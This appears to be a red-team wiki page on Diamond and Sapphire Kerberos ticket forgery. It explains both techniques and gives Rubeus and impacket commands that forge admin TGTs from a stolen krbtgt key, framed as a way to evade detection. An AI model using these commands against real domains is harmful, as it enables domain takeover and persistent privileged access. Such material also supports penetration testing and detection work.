**Diamond & Sapphire tickets** — stealthier TGT forgery than a [Golden Ticket](../Persistence/Golden%20Ticket.md), designed to survive detections that flag wholly-forged tickets. Both still need the `krbtgt` key, but they base the ticket on *legitimate* material so the PAC and ticket fields look real.

## How it works

- **Diamond ticket:** request a normal TGT with valid credentials, **decrypt it with the `krbtgt` key**, modify the PAC (e.g. add group 512), re-encrypt. The ticket inherits legitimate timestamps/flags a Golden Ticket would fabricate.
- **Sapphire ticket:** instead of editing a PAC, embed a **real privileged user's PAC** obtained via S4U2self + U2U, so group membership is genuinely that of the impersonated admin.

## Discovery

Not applicable - post-compromise. Needs the `krbtgt` AES key (from [DCSync](../Credential%20Dumping/DCSync.md)) plus valid domain credentials.

## Exploitation

### Diamond (Rubeus, Windows)

```powershell

Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /user:USER_NAME /password:USER_PASS /enctype:aes /ticketuser:ADMIN /domain:DOMAIN /dc:DC_FQDN /ptt

```

### Sapphire (impacket, Linux)

```bash

ticketer.py -request -impersonate 'ADMIN' -domain 'DOMAIN' -user 'USER_NAME' -password 'USER_PASS' -aesKey 'KRBTGT_AES_KEY' -domain-sid 'DOMAIN_SID' 'USER_NAME'
export KRB5CCNAME='USER_NAME.ccache'

```

Then use the ticket - see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).

## Caution

- Still defeated by a double `krbtgt` reset (same as Golden). Use AES keys, not RC4.
- More convincing than a Golden Ticket but not invisible - anomalous TGS requests and replication events can still surface them.

## References

- The Hacker Recipes - Diamond ticket - https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond
- The Hacker Recipes - Sapphire ticket - https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire
- GhostPack Rubeus - https://github.com/GhostPack/Rubeus
